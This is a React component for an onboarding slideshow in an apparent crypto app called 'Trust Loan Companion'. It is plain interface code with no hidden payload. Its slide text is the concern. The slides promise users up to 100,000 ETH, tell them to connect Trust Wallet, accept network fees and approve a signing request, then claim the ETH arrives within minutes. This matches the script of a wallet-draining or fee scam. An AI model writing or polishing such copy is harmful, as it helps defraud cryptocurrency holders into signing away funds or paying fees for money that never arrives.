import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';

interface OnboardingModalProps {
  onComplete: () => void;
}

const slides = [
  {
    title: 'Welcome to Trust Loan Companion',
    subtitle: 'A quick tour will guide you through the main actions.',
    icon: <img src="/images/welcome.png" alt="Welcome" className="w-full h-full object-contain" />
  },
  {
    title: 'Connect Trust Wallet',
    subtitle: 'Connect your Trust Wallet to get started.',
    icon: <img src="/images/connect-wallet.png" alt="Connect Wallet" className="w-full h-full object-contain" />
  },
  {
    title: 'Select Amount',
    subtitle: 'How much ETH would you like to receive?\nSelect any amount from the above boxes.\nThe maximum amount of Ethereum you can receive is 100,000 ETH.',
    icon: <img src="/images/select-amount.png" alt="Select Amount" className="w-full h-full object-contain" />
  },
  {
    title: 'Network Fee and Minimum Received',
    subtitle: 'Network fees and minimum received will be calculated based on the amount you\'re receiving.\nNote: These fees are paid to process and confirm transactions on the blockchain, compensating miners or validators for their work.',
    icon: <img src="/images/network-fee2.png" alt="Network Fee" className="w-full h-full object-contain" />
  },
  {
    title: 'Confirm Transaction Signing',
    subtitle: 'Approve the signing request that appears in your wallet.\nThis authorizes the transaction and confirms your loan process securely.',
    icon: <img src="/images/confirm-transactions2.png" alt="Confirm Transaction" className="w-full h-full object-contain" />
  },
  {
    title: 'ETH Sent Successfully to Your Wallet',
    subtitle: 'Check and refresh your wallet — your ETH should arrive in under 3 minutes.',
    icon: <video src="/images/refresh.mp4" autoPlay 
  loop 
  muted 
  playsInline 
  className="w-full h-auto object-contain bg-white" />
  }
];


const OnboardingModal: React.FC<OnboardingModalProps> = ({ onComplete }) => {
  const [currentSlide, setCurrentSlide] = useState<number>(0);

  const nextSlide = () => {
    if (currentSlide < slides.length - 1) {
      setCurrentSlide(currentSlide + 1);
    } else {
      onComplete();
    }
  };

  const prevSlide = () => {
    if (currentSlide > 0) {
      setCurrentSlide(currentSlide - 1);
    }
  };

  const slideVariants = {
    enter: { opacity: 0, x: 50 },
    center: { opacity: 1, x: 0 },
    exit: { opacity: 0, x: -50 }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-md">
      <motion.div
        initial={{ opacity: 0, scale: 0.9 }}
        animate={{ opacity: 1, scale: 1 }}
        className="relative max-w-md mx-4 bg-white/10 backdrop-blur-xl rounded-2xl p-6 shadow-2xl border border-white/20"
        style={{ boxShadow: '0 0 20px rgba(0, 255, 255, 0.5)' }} // Neon cyan glow
      >
        {/* Header Pill */}
        <div className="text-center mb-4">
          <span className="inline-block bg-gradient-to-r from-purple-500 to-cyan-500 text-white px-4 py-2 rounded-full text-sm font-semibold">
            How to participate
          </span>
        </div>

        {/* Slide Content */}
        <AnimatePresence mode="wait">
          <motion.div
            key={currentSlide}
            variants={slideVariants}
            initial="enter"
            animate="center"
            exit="exit"
            transition={{ duration: 0.3 }}
            className="text-center"
          >
            <motion.div
              key={currentSlide}
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              transition={{ duration: 0.4 }}
              className="flex justify-center mb-6"
            >
              <div className="relative w-full h-[250px] md:h-[400px] bg-white flex items-center justify-center overflow-hidden">
                {slides[currentSlide].icon}
              </div>
            </motion.div>
            <h2 className="text-2xl font-bold text-white mb-2">{slides[currentSlide].title}</h2>
            <p className="text-gray-300 leading-relaxed whitespace-pre-line">{slides[currentSlide].subtitle}</p>
          </motion.div>
        </AnimatePresence>

        {/* Progress Dots */}
        <div className="flex justify-center mt-6 mb-4">
          {slides.map((_, index) => (
            <div
              key={index}
              className={`w-3 h-3 rounded-full mx-1 ${
                index === currentSlide ? 'bg-cyan-400' : 'bg-gray-600'
              }`}
            />
          ))}
        </div>

        {/* Navigation Buttons */}
        <div className="flex justify-center gap-3">
          <button
            onClick={prevSlide}
            disabled={currentSlide === 0}
            className="px-5 py-2 rounded-lg bg-gray-600 text-white font-semibold hover:opacity-80 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Previous
          </button>
          <button
            onClick={nextSlide}
            className={`px-5 py-2 rounded-lg font-semibold hover:opacity-80 transition-opacity ${
              currentSlide === slides.length - 1
                ? 'bg-green-500 text-white' // Accent color for Finish
                : 'bg-gradient-to-r from-purple-500 to-cyan-500 text-white'
            }`}
          >
            {currentSlide === slides.length - 1 ? 'Finish' : 'Next'}
          </button>
        </div>
      </motion.div>
    </div>
  );
};

export default OnboardingModal;
